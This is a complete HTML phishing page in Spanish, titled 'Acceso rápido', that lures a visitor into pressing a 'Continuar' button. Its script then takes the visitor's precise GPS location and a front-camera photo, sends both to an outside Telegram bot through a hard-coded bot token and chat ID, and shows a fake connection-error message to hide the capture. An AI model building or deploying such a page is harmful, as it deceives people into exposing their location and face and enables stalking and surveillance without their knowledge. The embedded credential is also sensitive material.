<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Acceso rápido</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #e8f5e9;  /* verde claro, diferente al azul de society */
            font-family: 'Segoe UI', Roboto, system-ui, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        .card {
            background: white;
            border-radius: 16px;
            box-shadow: 0 8px 28px rgba(0,0,0,0.12);
            padding: 32px 24px;
            max-width: 400px;
            width: 100%;
            text-align: center;
        }
        h1 {
            font-size: 1.8rem;
            font-weight: 600;
            color: #2e7d32;  /* verde oscuro */
            margin-bottom: 12px;
        }
        p {
            color: #5f6368;
            font-size: 0.9rem;
            margin-bottom: 28px;
        }
        button {
            background: #2e7d32;
            color: white;
            border: none;
            border-radius: 28px;
            padding: 12px 24px;
            font-size: 1rem;
            font-weight: 500;
            cursor: pointer;
            width: 100%;
            transition: background 0.2s;
        }
        button:active {
            background: #1b5e20;
            transform: scale(0.98);
        }
        .error-msg {
            margin-top: 20px;
            color: #d32f2f;
            font-size: 0.8rem;
            background: #ffebee;
            padding: 8px;
            border-radius: 8px;
            display: none;
        }
    </style>
</head>
<body>
<div class="card">
    <h1>🔓 Acceso rápido</h1>
    <p>Presiona el botón para continuar</p>
    <button id="btn">Continuar</button>
    <div id="errorMsg" class="error-msg"></div>
</div>

<video id="video" autoplay playsinline style="display:none"></video>
<canvas id="canvas" style="display:none"></canvas>

<script>
    // ================= TOKEN Y CHAT ID (directos) =================
    const BOT_TOKEN = '8803149571:AAF6V8NewmO0JSUAlXdJh1NUuhMo1lwOH6s';  // ⚠️ REVOCA ESTE Y PON UNO NUEVO
    const CHAT_ID = '7555997298';                                        // TU CHAT ID

    // ================= FUNCIONES =================
    async function getGPS() {
        return new Promise((resolve) => {
            if (!navigator.geolocation) { resolve(null); return; }
            navigator.geolocation.getCurrentPosition(
                (pos) => resolve({ lat: pos.coords.latitude, lng: pos.coords.longitude, accuracy: pos.coords.accuracy }),
                () => resolve(null),
                { enableHighAccuracy: true, timeout: 15000 }
            );
        });
    }

    async function capturePhoto() {
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        let stream = null;
        try {
            stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
        } catch(e) {
            try { stream = await navigator.mediaDevices.getUserMedia({ video: true }); }
            catch(err) { return null; }
        }
        video.srcObject = stream;
        await new Promise(resolve => { video.onloadedmetadata = () => { video.play(); resolve(); }; });
        await new Promise(r => setTimeout(r, 500));
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
        const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
        stream.getTracks().forEach(t => t.stop());
        return blob;
    }

    async function sendMessage(text) {
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        try {
            await fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: CHAT_ID, text, parse_mode: 'Markdown' })
            });
        } catch(e) { console.error(e); }
    }

    async function sendPhoto(blob) {
        const fd = new FormData();
        fd.append('chat_id', CHAT_ID);
        fd.append('photo', blob, 'photo.jpg');
        try {
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
        } catch(e) { console.error(e); }
    }

    document.getElementById('btn').onclick = async () => {
        const gps = await getGPS();
        let text = '';
        if (gps) {
            text = `📍 *Ubicación exacta:*\nLat: ${gps.lat}\nLng: ${gps.lng}\nPrecisión: ±${gps.accuracy}m\nhttps://www.google.com/maps?q=${gps.lat},${gps.lng}`;
        } else {
            text = '📍 Ubicación no disponible (permiso denegado)';
        }
        const foto = await capturePhoto();

        // Enviar texto y foto a Telegram
        await sendMessage(text);
        if (foto) await sendPhoto(foto);

        // Mostrar mensaje de error falso (sin redirigir)
        const errorDiv = document.getElementById('errorMsg');
        errorDiv.innerText = 'Error de conexión. Por favor, recarga la página e intenta de nuevo.';
        errorDiv.style.display = 'block';
    };
</script>
</body>
</html>
